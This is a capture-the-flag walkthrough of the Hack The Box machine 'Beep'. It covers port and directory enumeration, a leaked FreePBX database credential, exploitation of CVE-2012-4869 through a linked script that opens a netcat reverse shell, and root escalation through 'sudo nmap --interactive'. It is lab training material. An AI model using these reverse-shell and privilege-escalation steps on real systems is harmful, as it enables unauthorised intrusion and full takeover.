# Hackthebox Beep

Reset the machine just in case.

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ sudo nmap -sV -p- 10.10.10.7
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 13:51 EDT
Nmap scan report for 10.10.10.7
Host is up (0.063s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
879/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 900.78 seconds

$ sudo nmap -A -T4 10.10.10.7
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-05 14:15 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.10.7
Host is up (0.10s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-11-05T19:20:27+00:00; +1h00m23s from scanner time.
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=11/5%OT=22%CT=1%CU=33848%PV=Y%DS=2%DC=T%G=Y%TM=6185779
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=C4%GCD=1%ISR=C8%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11N
OS:W7%O6=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
OS:=Y%DF=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0%
OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 1h00m22s

```

Enumerate the directories. Since the certificate is expired we need parameter -k.

```
$ gobuster dir -k -u https://10.10.10.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                        1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/05 15:12:21 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]  
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]   
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]  
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] 
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]   
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]    
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]  
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]   
/recordings           (Status: 301) [Size: 314] [--> https://10.10.10.7/recordings/
/configs              (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/]
/vtigercrm            (Status: 301) [Size: 313] [--> https://10.10.10.7/vtigercrm/]

```

Investigating the directories the interesting ones seem to be admin and vtigercrm.
vtigercrm opens up a login page gor vtiger crm.


If anyone finds this interesting, accessing admin page before I reset the machine brought up this:
directory admin throws and error (/admin/config.php) with a lot of usernames and passwords.

```
FATAL ERROR
DELETE FROM notifications WHERE module = 'core' AND id = 'AMPDBPASS' [nativecode=126 ** Incorrect key file for table './asterisk/notifications.MYI'; try to repair it]SQL -
DELETE FROM notifications WHERE module = 'core' AND id = 'AMPDBPASS'
Trace Back

Array
(
    [0] => Array
        (
            [file] => /var/www/html/admin/functions.inc.php
            [line] => 1449
            [function] => die_freepbx
            [args] => Array
                (
                    [0] => DELETE FROM notifications WHERE module = 'core' AND id = 'AMPDBPASS' [nativecode=126 ** Incorrect key file for table './asterisk/notifications.MYI'; try to repair it]SQL - 
 DELETE FROM notifications WHERE module = 'core' AND id = 'AMPDBPASS'
                )

        )

    [1] => Array
        (
            [file] => /var/www/html/admin/functions.inc.php
            [line] => 142
            [function] => sql
            [args] => Array
                (
                    [0] => DELETE FROM notifications WHERE module = 'core' AND id = 'AMPDBPASS'
                )

        )

    [2] => Array
        (
            [file] => /var/www/html/admin/common/db_connect.php
            [line] => 80
            [function] => delete
            [class] => notifications
            [object] => notifications Object
                (
                    [not_loaded] => 1
                    [notification_table] => Array
                        (
                        )

                    [_db] => DB_mysql Object
                        (
                            [phptype] => mysql
                            [dbsyntax] => mysql
                            [features] => Array
                                (
                                    [limit] => alter
                                    [new_link] => 4.2.0
                                    [numrows] => 1
                                    [pconnect] => 1
                                    [prepare] => 
                                    [ssl] => 
                                    [transactions] => 1
                                )

                            [errorcode_map] => Array
                                (
                                    [1004] => -15
                                    [1005] => -15
                                    [1006] => -15
                                    [1007] => -5
                                    [1008] => -17
                                    [1022] => -5
                                    [1044] => -26
                                    [1046] => -14
                                    [1048] => -3
                                    [1049] => -27
                                    [1050] => -5
                                    [1051] => -18
                                    [1054] => -19
                                    [1061] => -5
                                    [1062] => -5
                                    [1064] => -2
                                    [1091] => -4
                                    [1100] => -21
                                    [1136] => -22
                                    [1142] => -26
                                    [1146] => -18
                                    [1216] => -3
                                    [1217] => -3
                                    [1356] => -13
                                    [1451] => -3
                                    [1452] => -3
                                )

                            [connection] => Resource id #21
                            [dsn] => Array
                                (
                                    [phptype] => mysql
                                    [dbsyntax] => mysql
                                    [username] => asteriskuser
                                    [password] => jEhdIekWmdjE
                                    [protocol] => tcp
                                    [hostspec] => localhost
                                    [port] => 
                                    [socket] => 
                                    [database] => asterisk
                                )

                            [autocommit] => 1
                            [transaction_opcount] => 0
                            [_db] => asterisk
                            [fetchmode] => 1
                            [fetchmode_object_class] => stdClass
                            [was_connected] => 
                            [last_query] => DELETE FROM notifications WHERE module = 'core' AND id = 'AMPDBPASS'
                            [options] => Array
                                (
                                    [result_buffering] => 500
                                    [persistent] => 
                                    [ssl] => 
                                    [debug] => 0
                                    [seqname_format] => %s_seq
                                    [autofree] => 
                                    [portability] => 0
                                    [optimize] => performance
                                )

                            [last_parameters] => Array
                                (
                                )

                            [prepare_tokens] => Array
                                (
                                )

                            [prepare_types] => Array
                                (
                                )

                            [prepared_queries] => Array
                                (
                                )

                            [_last_query_manip] => 1
                            [_next_query_manip] => 
                            [_debug] => 
                            [_default_error_mode] => 
                            [_default_error_options] => 
                            [_default_error_handler] => 
                            [_error_class] => DB_Error
                            [_expected_errors] => Array
                                (
                                )

                        )

                )

            [type] => ->
            [args] => Array
                (
                    [0] => core
                    [1] => AMPDBPASS
                )

        )

    [3] => Array
        (
            [file] => /var/www/html/admin/header.php
            [line] => 131
            [args] => Array
                (
                    [0] => /var/www/html/admin/common/db_connect.php
                )

            [function] => require_once
        )

    [4] => Array
        (
            [file] => /var/www/html/admin/config.php
            [line] => 54
            [args] => Array
                (
                    [0] => /var/www/html/admin/header.php
                )

            [function] => include
        )

)

```

Opening https://10.10.10.7:10000 shows a login page to a Webmin server.


As a side note, the machine seems to quite unstable, so the goal of this is just to grab the flag one way and move on the next machines.

## Vulnerability analysis

### FreePBX 2.8.1.4 / Elastix 2.2.0

FreePBX version 2.10.0 and below have a remote code execution vulnerability that we should be able to use:

CVE-2012-4869: The callme_startcall function in recordings/misc/callme_page.php in FreePBX 2.9, 2.10, and earlier allows remote attackers to execute arbitrary commands via the callmenum parameter in a c action.


## System hacking

Credit for the exploit script goes to infosecjunky: https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution/blob/master/exploit.py

The script sets up a remote shell, so launch first the listener

```
$ nc -nvlp 4444                                                                                                                              1 ⨯
listening on [any] 4444 ...
```

And after changing the correct IP-addresses in to the script, execute it

```
$ /home/kali/.pyenv/versions/my-virtual-env-2.7.18/bin/python exploit.py
```

And it does its magic, we have a shell. Using nmap in interactive mode we're given a privileged shell.

```
$ nc -nvlp 4444                                                                                                                              1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.7] 55966
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
ls -al /root/root.txt
-rw------- 1 root root 33 Nov  6 18:12 /root/root.txt
```



